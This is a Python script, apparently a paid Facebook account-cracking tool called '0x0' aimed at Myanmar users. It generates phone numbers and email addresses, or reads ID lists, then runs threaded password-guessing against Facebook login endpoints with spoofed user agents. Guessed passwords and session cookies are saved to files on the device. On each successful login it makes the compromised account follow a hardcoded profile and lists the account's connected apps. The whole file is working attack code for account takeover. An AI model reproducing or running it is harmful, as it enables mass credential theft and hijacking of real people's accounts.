#!/usr/bin/python3
#-*-coding:utf-8-*-
import os,sys,time,json,random,re,string,base64
os.system("git pull")
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as bs
from datetime import date
from datetime import datetime
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

done = """
OK"""


RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
RESET = "\033[0m"
BOLD	 = "\033[1m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
color = [RED,GREEN,YELLOW,BLUE,MAGENTA,CYAN]

P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
loop = 0
oks=[]
cps=[]
ugen=[]
pcp=[]
cp_cpx=[]
def logo():
    print(BOLD + RED + "   _____    __  __    _____    " + RESET)
    print(BOLD + GREEN + "  / ___ \ /\  /\  /\ / ___ \   " + RESET)
    print(BOLD + YELLOW + " / /\_/\ \\ \ \/ / // /\_/\ \  " + RESET)
    print(BOLD + BLUE + "/ /_/ (_\ \\ \  / // /_/ (_\ \ " + RESET)
    print(BOLD + MAGENTA + "\ \ )_/ / // /  \ \\ \ )_/ / / " + RESET)
    print(BOLD + CYAN + " \ \/_\/ // / /\ \ \\ \/_\/ /  " + RESET)
    print(BOLD + RED + "  \____/ \/__\/__\/ \____/   " + RESET)
    print()
    print(f"{CYAN}Author : {BOLD}{RED}Team 0x0{RESET}")
    print(f"{CYAN}Version : {BOLD}{RED}0x0 - v2 {RESET}")
    print(f"{CYAN}Status : {BOLD}{RED}PAID{RESET}")
    print(f"{random.choice(color)}=="*20)
    print()
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[+] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Added on"," Added on"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸ¥µ] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
def follow(session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/minmayloelarxd', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        ver = random.choice(['1','2','3','4','5','6','7','8','9','10','11','12'])
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f'Readmi Note;{ver}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uag=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uag)
    
def line():
    print(f"{random.choice(color)}=="*20+f"{RESET}")
def clear():
    os.system('clear')

        

def menu():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                        logo()
                        print(f"{BOLD}{CYAN}[1] File Clone\n[2] Number Clone\n[3] Mail Clone\n[4] Contact Us{RESET}") 
                        line()
                        xd=input(f"{BOLD}{YELLOW}[0x0] >> {RESET}")
                        if xd in ['1','01']:
                                clear()
                                logo()
                                print('Put file example:  File.txt  etc..')
                                line()
                                file = input('Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                logo()
                                line()
                                plist = []
                                try:
                                        ps_limit = int(input('How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                line()
                                print('\033[1;32mexp: first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f'Put password {i+1}: '))
                                line()
                                print('Do you went show cp account? (y/n): ')
                                line()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with ThreadPool(max_workers=40) as crack_submit:
                                        clear()
                                        logo()
                                        total_ids = str(len(fo))
                                        print('Total account : \033[1;32m'+total_ids)
                                        print("\033[1;37m\x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                crack_submit.submit(rndm,ids,names,passlist)
                                print('\033[1;37m')
                                line()
                                print('The process has completed')
                                print('Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input('Press enter to back ')
                        elif xd in ['2' ,'02']:
                                num()
                        elif xd in ['3','03']:
                              gmail()
                        elif xd in ['4','04']:
                              contact()
                        else:
                                sys.exit(f"{RED}Wrong Input Bye...")

        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\nNo internet connection ...')
                exit()
def gmail():

                os.system('rm -rf .mail.txt')
                clear()
                logo()
                print(f'\033[1;33m example: KyawKyaw, ZawZaw, Myo, Lwin')
                line()
                first = input(f'{CYAN}{BOLD} Enter Firstname: ')
                print('\033[1;33m example: Aung, Htet,  \033[1;93m\033[1;97m')
                line()
                last = input(f'{CYAN}{BOLD} Enter Lastname: ')
                line()
                print('\033[1;33m Example: @gmail.com , @yahoo.com etc...')
                line()
                domain = input(f'{CYAN}{BOLD} Enter Domain: ')
                line()
                print('\033[1;33m Do You Want to add . in gmail ? ')
                line()
                dot = input(" Enter (Y/N) : ")
                line()
                try:
                        limit=int(input(' Enter Limit: '))
                except ValueError:
                        limit = 5000
                line()
                print(' Getting gmails...')
                if dot in ["y","Y"]:
                        lists = ['3','4']
                        for xd in range(limit):
                                lchoice = random.choice(lists)
                                if '3' in lchoice:
                                        mail = ''.join(random.choice(string.digits) for _ in range(3))
                                        open('.mail.txt','a').write(first.lower()+last.lower()+"."+mail+domain+'|'+first+' '+last+'\n')
                                else:
                                        mail = ''.join(random.choice(string.digits) for _ in range(4))
                                        open('.mail.txt','a').write(first.lower()+last.lower()+"."+mail+domain+'|'+first+' '+last+'\n')
                                fo = open('.mail.txt', 'r').read().splitlines()
                else:
                        lists = ['3','4']
                        for xd in range(limit):
                                lchoice = random.choice(lists)
                                if '3' in lchoice:
                                        mail = ''.join(random.choice(string.digits) for _ in range(3))
                                        open('.mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                                else:
                                        mail = ''.join(random.choice(string.digits) for _ in range(4))
                                        open('.mail.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                                fo = open('.mail.txt', 'r').read().splitlines()      
                with ThreadPool(max_workers=30) as crack:
                        total = str(len(fo))
                        clear()
                        logo()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        line()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'htet'
                                first = first_name.lower()
                                last = last_name.lower()
                                passlist = [first+last,first+' '+last,first+'123',first+'12345',first+'123456',first,first+'1234',first+'12',first+last+'123',first+last+'1234',first+last+'12345']
                                crack.submit(mai,ids,passlist)
                                        
                print('\033[1;37m')
                line()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                line()

def mai(ids,passlist):
                try:
                        global loop,oks,cps
                        sys.stdout.write('\r\r\033[1;37m[0x0] - %s \033[1;32mOK-%s \033[1;33mCP-%s\033[1;97m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                        for pas in passlist:
                                
                                session = requests.Session()
                                ug = random.choice(ugen)
                                head ={'authority': 'm.facebook.com',
                                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                       'method':'POST',
                                       'accept-language': 'en-US,en;q=0.9',
                                       'cache-coxntrol': 'max-age=0',
                                       'content-type': 'application/x-www-form-urlencoded',
                                       'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                                       'sec-ch-ua-mobile': '?0',
                                       'sec-ch-ua-platform': '"Android"',
                                       'sec-fetch-dest': 'document',
                                       'sec-fetch-mode': 'navigate',
                                       'sec-fetch-site': 'same-origin',
                                       'sec-fetch-user': '?1',
                                       'upgrade-insecure-requests': '1',
                                       'user-agent': ug,
                                }
                                free_fb = session.get('https://mbasic.facebook.com').text
                                data= {
                                      "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                                      "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                                      "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                                      "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                                      "try_number":"0",
                                      "unrecognized_tries":"0",
                                      "email":ids,
                                      "pass":pas,
                                      "login":"Log In"}
                                response_body2=session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,allow_redirects=True,headers=head)
                                cookie=str(session.cookies.get_dict())
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                
                                if "c_user" in cookie:
                                        print('\r\r\033[1;32m [0x0] ã€‹OK %s | %s'%(ids,pas))
                                        print(" Cookie :" ,coki)
                                        open('/sdcard/0x0_OK_mail.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        line()
                                        follow(session, coki)
                                        cek_apk(session,coki)
                                        oks.append(ids)
                                elif 'checkpoint' in cookie:
                                        print('\r\033[1;33m [0x0] ã€‹CP '+ids+' | '+pas)

                                        open('/sdcard/0x0_CP_mail.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        line()
                                        cps.append(ids)
                                elif "To help keep your account safe, we've temporarily locked it. Before you try logging in again, check your login info and make sure that you're using your usual device on a secure network." in response_body2.text:
                                        print(f"{BOLD}{YELLOW}Pls change Your Network Or VPN ")
                                        time.sleep(60)
                                else:
                                        continue
                        loop+=1

                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,names,passlist):
                try:
                        global loop,oks,cps
                        sys.stdout.write(f"\r\r\033[1;{str(random.randrange(30,39))}m[0x0] - %s \033[1;32mOK-%s \033[1;33mCP-%s\033[1;97m"%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pasy in passlist:
                                pas = pasy.replace('first',fn.lower()).replace('First',fn.capitalize()).replace('last',ln.lower()).replace('Last',ln.capitalize()).replace('Name',names.capitalize()).replace('name',names.lower())
                                session = requests.Session()
                                ug = random.choice(ugen)
                                
                                
                                head ={'authority': 'mbasic.facebook.com',
                                       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                                       'method':'POST',
                                       'accept-language': 'en-US,en;q=0.9',
                                       'cache-coxntrol': 'max-age=0',
                                       'content-type': 'application/x-www-form-urlencoded',
                                       'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                                       'sec-ch-ua-mobile': '?0',
                                       'sec-ch-ua-platform': '"Linux"',
                                       'sec-fetch-dest': 'document',
                                       'sec-fetch-mode': 'navigate',
                                       'sec-fetch-site': 'same-origin',
                                       'sec-fetch-user': '?1',
                                       'upgrade-insecure-requests': '1',
                                       'user-agent': ug,
                                }
                                free_fb = session.get('https://mbasic.facebook.com').text
                                data= {
                                      "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                                      "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                                      "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                                      "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                                      "try_number":"0",
                                      "unrecognized_tries":"0",
                                      "email":ids,
                                      "pass":pas,
                                      "login":"Log In"}

                                response_body2=session.post("https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fcookie%2Fconsent%2F%3Fnext_uri%3Dhttps%253A%252F%252Fmbasic.facebook.com%252Flogin%252Fdevice-based%252Flogin%252Fasync%252F%253Frefsrc%253Ddeprecated%2526lwv%253D100&ref=104&refsrc=deprecated",data=data,headers=head)
                                cookie=str(session.cookies.get_dict())
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                open("o.html",'wb').write(response_body2.content)
                                
                                if "c_user" in cookie:
                                        print('\r\r\033[1;32m [0x0] ã€‹OK %s | %s'%(ids,pas))
                                        open('/sdcard/0x0_OK_file.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        
                                        line()
                                        oks.append(ids)
                                        follow(session, coki)
                                        cek_apk(session,coki)
                                elif 'checkpoint' in cookie:
                                        print('\r\033[1;33m [0x0] ã€‹CP '+ids+' | '+pas)
                                        open('/sdcard/0x0_CP_file.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                        line()
                                        cps.append(ids)
                                elif "To help keep your account safe, we've temporarily locked it. Before you try logging in again, check your login info and make sure that you're using your usual device on a secure network." in response_body2.text:
                                       print(f"{BOLD}{YELLOW}Pls change Your Network Or VPN ")
                                       time.sleep(60)
                                else:
                                        continue
                        loop+=1

                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                    pass
                

def num():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    logo()
    print('\033[1;32m [âˆš] SIM CODE : 0978/0977,0979,0925,0995')
    line()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    logo()
    print('\033[1;32m [âˆš] EXAMPLE : 3000/5000/10000/50000')
    line()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    line()
    xd_cp=input(f'\033[1;32m [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        logo()
        tl = str(len(user))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;92m [+] Crack Process Has Started')
        print('\033[1;92m [!] Use Flight Mode For Speed Up')
        line()
        for fuck in user:
            uid = code+fuck
            pwx = [uid,fuck,fuck[1:],'Myanmar','kyawkyaw','KyawKyaw','nyinyi','myanmar','myanmar123','moemoe','Aung123','ayeaye','nyinyi123','Myanmar123','thuthu','kyaw123','soe123','zawzaw','zaw123','thuzar','thuzar123','kyawgyi','linlin','chitchit','waiwai','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung']
            
            ahare.submit(mumitx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    line()

def mumitx(uid,pwx,tl):
    try:
        global loop,cps,oks
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96m0x0\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.alpha.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://x.alpha.facebook.com',
    'referer': 'https://x.alpha.facebook.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-asbd-id': '198387',
    'x-fb-lsd': 'AVoPmsopEAk',
    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[0x0-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                open('/sdcard/0x0_OK_num.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                line()
                cek_apk(session,coki)
                follow(session, coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[0x0-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/0x0_CP_num.txt', 'a').write( uid+' | '+ps+' | '+coki+' \n')
                cps.append(cid)
                line()
                break
            elif "To help keep your account safe, we've temporarily locked it. Before you try logging in again, check your login info and make sure that you're using your usual device on a secure network." in lo:
                print(f"{BOLD}{YELLOW}Pls change Your Network Or VPN ")
                time.sleep(60)
                time.sleep(10)
            else:
                continue
        loop+=1
        
    except:
        pass
def rd2(ids,passlist):
        try:
                global loop,cps
                sys.stdout.write('\r\r\33[1;37m[0x0]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                for pas in passlist:
                        session = requests.Session()
                        ug = random.choice(ugen)
                        head ={'authority': 'x.alpha.facebook.com',
                               'method':'POST',
                               'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                               'scheme':'https',
                               'accept': '*/*',
                               'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                               'content-type': 'application/x-www-form-urlencoded',
                               'origin': 'https://x.alpha.facebook.com',
                               'referer': 'https://x.alpha.facebook.com/',
                               'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
                               'sec-ch-ua-mobile': '?0',
                               'sec-ch-ua-platform': '"Android"',
                               'sec-fetch-dest': 'empty',
                               'sec-fetch-mode': 'cors',
                               'sec-fetch-site': 'same-origin',
                               'x-asbd-id': '198387',
                               'x-fb-lsd': 'AVoPmsopEAk',
                                'user-agent': ug,
                                }
                        free_fb = session.get('https://mbasic.facebook.com').text
                        data= {
                              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                              "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                              "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                              "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                              "try_number":"0",
                              "unrecognized_tries":"0",
                              "email":ids,
                              "pass":pas,
                              "login":"Log In"}
                        response_body2=session.post("https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=head)
                        cookie=str(session.cookies.get_dict())
                        open("o.html",'wb').write(response_body2.content)
                        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                        if "c_user" in cookie:
                                print('\r\r\033[1;32m [0x0] ã€‹OK %s | %s'%(ids,pas))
                                
                                follow(session, coki)
                                cek_apk(session,coki)

                                print(" Cookie :" ,coki)
                                open('/sdcard/0x0_OK.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                line()
                                oks.append(ids)
                        elif 'checkpoint' in cookie:
                                print('\r\033[1;33m [0x0] ã€‹CP '+ids+' | '+pas)
                                

                                open('/sdcard/0x0_CP.txt', 'a').write(ids+'|'+pas+ '|' + coki  +'\n')
                                line()
                                cps.append(ids)
                        elif "To help keep your account safe, we've temporarily locked it. Before you try logging in again, check your login info and make sure that you're using your usual device on a secure network." in response_body2.text:
                            print(f"{BOLD}{YELLOW}Pls change Your Network Or VPN ")
                            time.sleep(60)
                            time.sleep(60)
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                        time.sleep(10)
        except Exception as e:
                        pass

def contact():
    admin = ["https://t.me/gusgus34","https://t.me/ayoelay482","https://t.me/GJack999"]
    print(f"{YELLOW}Admin List{RESET}")
    for ad in admin:
        print(ad)
    time.sleep(3)
    print("Contact To Random Admin");time.sleep(3)
    admin_acc = random.choice(admin)
    if admin_acc == "https://t.me/gusgus34":
        print(f"{CYAN}Admin : Gus Gus")
        os.system(f'xdg-open {admin_acc}')
    elif admin_acc == "https://t.me/ayoelay482":
        print(f"{CYAN}Admin : A Yoe Lay ")
        os.system(f'xdg-open {admin_acc}')
    else:
        print(f"{CYAN}Admin : Gjack")
        os.system(f'xdg-open {admin_acc}')
        
            
menu()
